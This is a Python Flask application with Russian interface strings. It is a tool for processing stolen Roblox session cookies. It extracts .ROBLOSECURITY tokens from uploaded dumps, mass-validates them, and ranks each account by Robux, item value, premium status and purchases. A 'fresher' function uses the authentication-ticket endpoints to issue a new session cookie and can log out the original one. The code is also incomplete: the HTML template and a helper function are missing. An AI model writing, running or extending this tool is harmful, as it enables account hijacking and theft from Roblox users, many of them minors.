import os
import time
import logging
import re
import urllib3
import json
import io
import zipfile
import uuid
import sqlite3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory, send_file, session
from flask_socketio import SocketIO, emit

# ==========================================
# ИНИЦИАЛИЗАЦИЯ
# ==========================================
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
DB_PATH = "data.db"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# SQLite БАЗА ДАННЫХ
# ==========================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT UNIQUE,
                    username TEXT,
                    created_at TEXT
                )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS checker_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT,
                    timestamp TEXT,
                    type TEXT,
                    total INTEGER,
                    valid INTEGER,
                    usernames TEXT,
                    results TEXT,
                    full_reports TEXT
                )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS fresher_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT,
                    timestamp TEXT,
                    mode TEXT,
                    refreshed_count INTEGER,
                    usernames TEXT,
                    cookies TEXT
                )''')
    
    conn.commit()
    conn.close()
    logger.info("✅ База данных инициализирована")

init_db()

# ==========================================
# SQLite ФУНКЦИИ
# ==========================================
def get_user_session_id():
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
        session['username'] = f"User_{session['user_id'][:6]}"
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO users (session_id, username, created_at) VALUES (?, ?, ?)",
                  (session['user_id'], session['username'], datetime.now().strftime('%d.%m.%Y')))
        conn.commit()
        conn.close()
    
    return session['user_id']

def add_checker_history(entry):
    sid = get_user_session_id()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO checker_history 
                 (session_id, timestamp, type, total, valid, usernames, results, full_reports)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', (
        sid,
        datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        entry.get('type', 'single'),
        entry.get('total', 1),
        entry.get('valid', 0),
        json.dumps(entry.get('usernames', []), ensure_ascii=False),
        json.dumps(entry.get('results', []), ensure_ascii=False),
        json.dumps(entry.get('full_reports', []), ensure_ascii=False)
    ))
    conn.commit()
    conn.close()

def get_checker_history():
    sid = get_user_session_id()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT timestamp, type, total, valid, usernames, results, full_reports 
                 FROM checker_history WHERE session_id=? ORDER BY id DESC LIMIT 50''', (sid,))
    rows = c.fetchall()
    conn.close()
    
    history = []
    for r in rows:
        history.append({
            'timestamp': r[0],
            'type': r[1],
            'total': r[2],
            'valid': r[3],
            'usernames': json.loads(r[4]) if r[4] else [],
            'results': json.loads(r[5]) if r[5] else [],
            'full_reports': json.loads(r[6]) if r[6] else []
        })
    return history

def clear_checker_history():
    sid = get_user_session_id()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM checker_history WHERE session_id=?", (sid,))
    conn.commit()
    conn.close()

def add_fresher_history(entry):
    sid = get_user_session_id()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO fresher_history 
                 (session_id, timestamp, mode, refreshed_count, usernames, cookies)
                 VALUES (?, ?, ?, ?, ?, ?)''', (
        sid,
        datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        entry.get('mode', 'duplicate'),
        entry.get('refreshed_count', 0),
        json.dumps(entry.get('usernames', []), ensure_ascii=False),
        json.dumps(entry.get('cookies', []), ensure_ascii=False)
    ))
    conn.commit()
    conn.close()

def get_fresher_history():
    sid = get_user_session_id()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT timestamp, mode, refreshed_count, usernames, cookies 
                 FROM fresher_history WHERE session_id=? ORDER BY id DESC LIMIT 50''', (sid,))
    rows = c.fetchall()
    conn.close()
    
    history = []
    for r in rows:
        history.append({
            'timestamp': r[0],
            'mode': r[1],
            'refreshed_count': r[2],
            'usernames': json.loads(r[3]) if r[3] else [],
            'cookies': json.loads(r[4]) if r[4] else []
        })
    return history

def clear_fresher_history():
    sid = get_user_session_id()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM fresher_history WHERE session_id=?", (sid,))
    conn.commit()
    conn.close()

# ==========================================
# ЧЕКЕР
# ==========================================
def extract_cookies_from_text(text):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='): cookie = cookie[15:]
        if len(cookie) > 50: cookies.append(cookie)
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies: cookies.append(cookie)
    seen = set()
    unique = []
    for c in cookies:
        if c not in seen: seen.add(c); unique.append(c)
    return unique

def get_user_rap(session, user_id):
    try:
        url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?assetType=All&limit=100"
        r = session.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json().get('data', [])
            val = sum(item.get('recentAveragePrice', 0) for item in data)
            return val if val > 0 else None
    except: pass
    return None

def get_user_playtime(session, user_id):
    try:
        url = f"https://screenshots.roblox.com/v1/users/{user_id}/play-time"
        r = session.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json()
            seconds = data.get('totalPlayTimeSeconds', 0)
            if seconds > 0: return round(seconds / 3600, 1)
    except: pass
    return None

def get_full_info(cookie):
    info = {
        'status':'❌', 'Username':'?', 'UserID':'?', 'Robux':0, 'RAP': None, 'PlaytimeHours': None,
        'Created':'?', 'Country':'?', 'EmailSet':False, 'TwoFactorEnabled':False,
        'AccountPinEnabled':False, 'PhoneSet':False, 'SecurityStatus':'⚠️ НИЗКИЙ',
        'Cookie':cookie, 'PurchasedGamepasses':{}, 'CreditCardsCount':0,
        'IsPremium':False, 'DonationTotal':0
    }
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code != 200: return info
        d = r.json()
        if 'id' not in d: return info
        info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except: return {}

        sd = g('https://www.roblox.com/my/settings/json')
        if sd:
            sec = sd.get('MyAccountSecurityModel',{})
            info['EmailSet'] = sec.get('IsEmailSet',False); info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False); info['PhoneSet'] = sec.get('IsPhoneSet',False)
        
        pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if pm and pm.get('isSubscribed'): info['IsPremium'] = True

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except: pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb: info['Robux'] = rb.get('robux',0)
        
        info['RAP'] = get_user_rap(s, uid)
        info['PlaytimeHours'] = get_user_playtime(s, uid)

        ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if ct: info['Country'] = ct.get('countryCode','?')

        try:
            total = 0; gp_dict = {}; cursor = ""; page = 0
            while page < 5:
                url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
                if cursor: url += f"&cursor={cursor}"
                r = s.get(url, verify=False, timeout=10)
                if r.status_code != 200: break
                data = r.json()
                for item in data.get('data',[]):
                    price = abs(item.get('currency',{}).get('amount',0)); total += price
                    if price >= 50:
                        nm = item.get('details',{}).get('name','Товар')
                        pn = item.get('details',{}).get('place',{}).get('name','Другие игры')
                        if pn not in gp_dict: gp_dict[pn] = []
                        gp_dict[pn].append({'name':nm,'price':price})
                cursor = data.get('nextPageCursor')
                if not cursor: break
                page += 1; time.sleep(0.1)
            info['PurchasedGamepasses'] = gp_dict; info['DonationTotal'] = total
        except: pass

        sc = 0
        if info['EmailSet']: sc += 1
        if info['TwoFactorEnabled']: sc += 2
        if info['AccountPinEnabled']: sc += 1
        if info['PhoneSet']: sc += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')
    except: pass
    return info

def quick_validate(cookie):
    result = {
        'status':'❌', 'username':'?', 'user_id':'?', 'robux':0, 'rap': None, 'playtime': None,
        'created':'?', 'is_premium':False, 'has_email':False, 'has_2fa':False,
        'cookie':cookie, 'score':0, 'full_info': None
    }
    info = get_full_info(cookie)
    if info['status'] == '✅':
        result['status'] = '✅'
        result['username'] = info['Username']
        result['user_id'] = info['UserID']
        result['robux'] = info['Robux']
        result['rap'] = info['RAP']
        result['playtime'] = info['PlaytimeHours']
        result['created'] = info['Created']
        result['is_premium'] = info['IsPremium']
        result['has_email'] = info['EmailSet']
        result['has_2fa'] = info['TwoFactorEnabled']
        result['full_info'] = info
        
        score = 0
        if info['Robux'] >= 10000: score += 100
        elif info['Robux'] >= 1000: score += 50
        elif info['Robux'] > 0: score += 10
        if info['RAP'] and info['RAP'] > 5000: score += 50
        if info['IsPremium']: score += 50
        if info['EmailSet']: score += 15
        if info['TwoFactorEnabled']: score += 10
        result['score'] = score
    return result

def mass_check(cookies_list):
    results = []
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
        for f in as_completed(futures):
            try: results.append(f.result())
            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'rap':None,'playtime':None,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
    valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
    valid.sort(key=lambda x: x['score'], reverse=True)
    return valid + invalid

# ==========================================
# ФОРМАТТЕРЫ (С ГЕЙМПАССАМИ ПО ПОПУЛЯРНЫМ ИГРАМ)
# ==========================================
def format_full_report(info):
    if info['status'] != '✅':
        return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
    
    rap_str = f"⏣ {info['RAP']:,}" if info['RAP'] is not None else "❌"
    play_str = f"{info['PlaytimeHours']} ч." if info['PlaytimeHours'] is not None else "❌"
    
    # ПОПУЛЯРНЫЕ ИГРЫ
    TARGET_GAMES = [
        'Adopt Me', 'Blox Fruits', 'Murder Mystery 2', 'Rivals',
        'Pet Simulator 99', 'Pet Simulator X', 'Arsenal', 'BedWars',
        'Tower Defense Simulator', 'Anime Adventures', 'Anime Vanguards',
        'Dragon Ball Rage', 'Shindo Life', 'King Legacy', 'Project Slayers',
        'Demon Slayer RPG 2', 'Fisch', 'Black Clover M', 'Jujutsu Shenanigans'
    ]
    
    gp = info.get('PurchasedGamepasses', {})
    gamepasses_by_game = {}
    total_spent = 0
    total_passes = 0
    
    for game_name, passes in gp.items():
        matched_game = None
        for target in TARGET_GAMES:
            if target.lower() in game_name.lower() or game_name.lower() in target.lower():
                matched_game = target
                break
        
        if not matched_game:
            continue
        
        if matched_game not in gamepasses_by_game:
            gamepasses_by_game[matched_game] = []
        
        for p in passes:
            gamepasses_by_game[matched_game].append({
                'name': p['name'],
                'price': p['price']
            })
            total_spent += p['price']
            total_passes += 1
    
    sorted_games = sorted(
        gamepasses_by_game.items(),
        key=lambda x: sum(p['price'] for p in x[1]),
        reverse=True
    )
    
    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💎 RAP: {rap_str} | ⏱️ Плейтайм: {play_str}\n"
    r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
    
    if sorted_games:
        r += f"\n📦 ГЕЙМПАССЫ (всего: {total_passes} шт., потрачено: ⏣ {total_spent:,}):\n"
        r += "─" * 40 + "\n"
        for game, passes in sorted_games:
            game_total = sum(p['price'] for p in passes)
            r += f"\n🎮 {game} (⏣ {game_total:,} потрачено, {len(passes)} гп):\n"
            passes_sorted = sorted(passes, key=lambda x: x['price'], reverse=True)
            for p in passes_sorted[:10]:
                r += f"   └─ {p['name']} — ⏣ {p['price']:,}\n"
            if len(passes) > 10:
                r += f"   └─ ... и ещё {len(passes) - 10} геймпассов\n"
    else:
        r += "\n📦 Геймпассов в популярных играх: ❌"
    
    r += f"\n\n🍪 {info['Cookie']}"
    return r

def format_quick_report(result):
    if result['status'] != '✅':
        return f"❌ НЕВАЛИД"
    
    info = result.get('full_info', {})
    if not info:
        score = result.get('score', 0)
        rank = "👑" if score >= 150 else ("💎" if score >= 100 else ("⭐" if score >= 60 else "🟢"))
        rap_str = f"RAP: {result['rap']:,}" if result['rap'] is not None else "RAP: ❌"
        play_str = f"{result['playtime']}h" if result['playtime'] is not None else "⏱️ ❌"
        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} ({rap_str}) | {play_str} | S:{score}"
    
    # ПОПУЛЯРНЫЕ ИГРЫ
    TARGET_GAMES = [
        'Adopt Me', 'Blox Fruits', 'Murder Mystery 2', 'Rivals',
        'Pet Simulator 99', 'Pet Simulator X', 'Arsenal', 'BedWars',
        'Tower Defense Simulator', 'Anime Adventures'
    ]
    
    gp = info.get('PurchasedGamepasses', {})
    gamepasses_text = ""
    total_spent = 0
    game_found = False
    
    for game_name, passes in gp.items():
        matched = False
        for target in TARGET_GAMES:
            if target.lower() in game_name.lower() or game_name.lower() in target.lower():
                matched = True
                break
        if matched:
            game_found = True
            game_total = sum(p['price'] for p in passes)
            total_spent += game_total
            gamepasses_text += f"\n  🎮 {game_name}: {len(passes)} гп, ⏣ {game_total:,}"
            top_passes = sorted(passes, key=lambda x: x['price'], reverse=True)[:3]
            for p in top_passes:
                gamepasses_text += f"\n     └─ {p['name']} — ⏣ {p['price']:,}"
            if len(passes) > 3:
                gamepasses_text += f"\n     └─ ... и ещё {len(passes) - 3}"
    
    if not game_found:
        gamepasses_text = "\n  ❌ Геймпассов в популярных играх не найдено"
    else:
        gamepasses_text = f"\n💰 Потрачено на геймпассы: ⏣ {total_spent:,}\n" + gamepasses_text
    
    rap_str = f"⏣ {info.get('RAP', 0):,}" if info.get('RAP') else "RAP: ❌"
    play_str = f"{info.get('PlaytimeHours', 0)} ч." if info.get('PlaytimeHours') else "⏱️ ❌"
    
    r = f"👤 {info.get('Username', '?')} | 🆔 {info.get('UserID', '?')}\n"
    r += f"💰 Robux: ⏣ {info.get('Robux', 0):,} | 💎 {rap_str} | ⏱️ {play_str}\n"
    r += f"⭐ Premium: {'✅' if info.get('IsPremium') else '❌'} | 🔐 {info.get('SecurityStatus', '⚠️ НИЗКИЙ')}\n"
    r += f"📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔑 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}"
    r += gamepasses_text
    r += f"\n🍪 {info.get('Cookie', '')[:50]}..."
    
    return r
# ==========================================
# ФРЕШЕР (MEOW TOOL)
# ==========================================
def refresh_roblox_cookie(cookie, kill_old=False):
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        cookies_dict = {'.ROBLOSECURITY': c}
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*'
        }
        
        check_r = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, headers=headers, timeout=10, verify=False)
        if check_r.status_code != 200:
            result['error'] = "Кука невалидна"; return result
        user_data = check_r.json()
        result['username'] = user_data.get('name', '?'); result['user_id'] = user_data.get('id', '?')
        
        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, verify=False, timeout=10)
        csrf_token = csrf_r.headers.get('x-csrf-token')
        if not csrf_token:
            result['error'] = "CSRF token not found"; return result
        
        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'referer': 'https://www.roblox.com/', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, verify=False, timeout=15)
        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
        if not auth_ticket:
            result['error'] = "Auth ticket not found"; return result
        
        redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, verify=False, timeout=15)
        
        new_cookie_value = None
        set_cookie = redeem_r.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
            if match: new_cookie_value = match.group(1)
        if not new_cookie_value:
            for co in redeem_r.cookies:
                if co.name == '.ROBLOSECURITY' and co.value: new_cookie_value = co.value; break
        if not new_cookie_value:
            result['error'] = "New cookie not found"; return result
        
        if kill_old:
            try:
                break_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
                requests.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict, verify=False, timeout=10)
            except: pass
        
        test_s = requests.Session()
        test_s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie_value}, verify=False, timeout=10)
        if test_r.status_code == 200 and 'id' in test_r.json():
            result['new_cookie'] = new_cookie_value; result['success'] = True
        else:
            result['error'] = "New cookie validation failed"
    except Exception as e:
        result['error'] = str(e)
    return result

# ==========================================
# ИНСТРУМЕНТЫ
# ==========================================
def merge_cookie_files(contents):
    all_cookies = []
    for c in contents:
        extracted = extract_cookies_from_text(c)
        all_cookies.extend(extracted)
    unique = list(dict.fromkeys(all_cookies))
    return '\n'.join(unique)

def remove_duplicates(content):
    cookies = extract_cookies_from_text(content)
    return '\n'.join(cookies)

# ==========================================
# FLASK APP + SOCKETIO
# ==========================================
app = Flask(__name__)
app.secret_key = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# ==========================================
# HTML (весь интерфейс)
# ==========================================
# HTML код здесь (используй из предыдущего сообщения)
# Он слишком большой, я его не вставляю повторно.
# Но он ТОТ ЖЕ САМЫЙ, что был в прошлом коде.

# ==========================================
# API МАРШРУТЫ
# ==========================================
@app.route("/")
def index():
    get_user_session_id()
    return render_template_string(HTML)

@app.route("/api/single-check", methods=["POST"])
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie:
        return jsonify({"success": False, "message": "Кук не предоставлен"})
    info = get_full_info(cookie)
    report = format_full_report(info)
    add_checker_history({
        'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0,
        'usernames': [info['Username']] if info['status']=='✅' else ['Unauthed'],
        'results': [report],
        'full_reports': [{'username': info['Username'], 'user_id': info['UserID'], 'report': report}]
    })
    return jsonify({"success": True, "report": report})

@app.route("/api/mass-check-ws", methods=["POST"])
def api_mass_check_ws():
    content = ""
    if 'file' in request.files:
        content = request.files['file'].read().decode('utf-8', errors='ignore')
    
    cookies = extract_cookies_from_text(content)
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    def run_check():
        total = len(cookies)
        valid_count = 0
        premium_count = 0
        total_robux = 0
        formatted_results = []
        full_reports = []
        usernames = []
        
        for i, cookie in enumerate(cookies):
            result = quick_validate(cookie)
            
            if result['status'] == '✅':
                valid_count += 1
                if result.get('is_premium'):
                    premium_count += 1
                total_robux += result.get('robux', 0)
                usernames.append(result.get('username', '?'))
                
                if result.get('full_info'):
                    full_report = format_full_report(result['full_info'])
                    full_reports.append({
                        'username': result.get('username', '?'),
                        'user_id': result.get('user_id', '?'),
                        'report': full_report
                    })
                    formatted_results.append(full_report)
                else:
                    formatted_results.append(format_quick_report(result))
            else:
                formatted_results.append("❌ НЕВАЛИД")
            
            socketio.emit('mass_progress', {
                'current': i + 1,
                'total': total,
                'result': formatted_results[-1],
                'full_report': full_reports[-1] if full_reports else None
            })
            
            time.sleep(0.05)
        
        add_checker_history({
            'type': 'mass', 'total': total, 'valid': valid_count,
            'usernames': usernames,
            'results': formatted_results,
            'full_reports': full_reports
        })
        
        socketio.emit('mass_complete', {
            'message': f'Проверка завершена! Валид: {valid_count}/{total}',
            'valid_count': valid_count,
            'premium_count': premium_count,
            'total_robux': total_robux
        })
    
    import threading
    threading.Thread(target=run_check, daemon=True).start()
    
    return jsonify({"success": True})

@app.route("/api/download-zip", methods=["POST"])
def api_download_zip():
    data = request.json or {}
    reports = data.get("reports", [])
    if not reports:
        return jsonify({"success": False, "message": "Нет отчетов"})
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for r in reports:
            fname = f"{r.get('username','user')}_{r.get('user_id','id')}.txt"
            zf.writestr(fname, r.get('report',''))
    
    zip_buffer.seek(0)
    return send_file(zip_buffer, mimetype="application/zip", as_attachment=True, download_name="roblox_accounts.zip")

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    cookies_list = extract_cookies_from_text(raw)
    if not cookies_list:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    only_cookies = []
    usernames = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(refresh_roblox_cookie, c, mode=='kill') for c in cookies_list]
        for f in as_completed(futures):
            res = f.result()
            if res['success'] and res['new_cookie']:
                only_cookies.append(res['new_cookie'])
                usernames.append(res.get('username','?'))
    
    add_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'usernames': usernames, 'cookies': only_cookies})
    return jsonify({"success": True, "only_cookies": '\n'.join(only_cookies)})

@app.route("/api/history/checker")
def api_history_checker():
    return jsonify({"history": get_checker_history()})

@app.route("/api/history/fresher")
def api_history_fresher():
    return jsonify({"history": get_fresher_history()})

@app.route("/api/history/checker/clear", methods=["POST"])
def api_clear_checker_history():
    clear_checker_history()
    return jsonify({"success": True})

@app.route("/api/history/fresher/clear", methods=["POST"])
def api_clear_fresher_history():
    clear_fresher_history()
    return jsonify({"success": True})

@app.route("/api/merge-cookies", methods=["POST"])
def api_merge_cookies():
    files = request.files.getlist('files')
    contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    merged = merge_cookie_files(contents)
    
    user_dir, sid = get_user_download_dir()
    filename = f"merged_{int(time.time())}.txt"
    filepath = os.path.join(user_dir, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(merged)
    
    return jsonify({"success": True, "download_url": f"/downloads/{sid}/{filename}"})

@app.route("/api/split-cookies", methods=["POST"])
def api_split_cookies():
    files = request.files.getlist('files')
    text_input = request.form.get('text', '')
    per_file = int(request.form.get('per_file', 1))

    all_contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    if text_input:
        all_contents.append(text_input)

    cookies = extract_cookies_from_text('\n'.join(all_contents))
    if not cookies:
        return jsonify({"success": False, "message": "Валидные куки для разделения не найдены"})

    chunks = [cookies[i:i + per_file] for i in range(0, len(cookies), per_file)]
    
    user_dir, sid = get_user_download_dir()
    zip_filename = f"splitted_cookies_{int(time.time())}.zip"
    zip_filepath = os.path.join(user_dir, zip_filename)

    with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zf:
        for idx, chunk in enumerate(chunks, 1):
            file_data = '\n'.join(chunk)
            zf.writestr(f"cookies_part_{idx}.txt", file_data)

    return jsonify({
        "success": True,
        "total_files": len(chunks),
        "download_url": f"/downloads/{sid}/{zip_filename}"
    })

@app.route("/api/clean-cookies", methods=["POST"])
def api_clean_cookies():
    data = request.json or {}
    processed = remove_duplicates(data.get("content", ""))
    
    user_dir, sid = get_user_download_dir()
    filename = f"cleaned_{int(time.time())}.txt"
    filepath = os.path.join(user_dir, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(processed)
    count = len([line for line in processed.split('\n') if line.strip()])
    return jsonify({"success": True, "count": count, "download_url": f"/downloads/{sid}/{filename}"})

@app.route("/downloads/<sid>/<filename>")
def download_file(sid, filename):
    user_sid = get_user_session_id()
    if sid != user_sid:
        return jsonify({"error": "Forbidden"}), 403
    return send_from_directory(os.path.join("downloads", sid), filename, as_attachment=True)

# ==========================================
# ТОЧКА ВХОДА
# ==========================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host="0.0.0.0", port=port, debug=False)
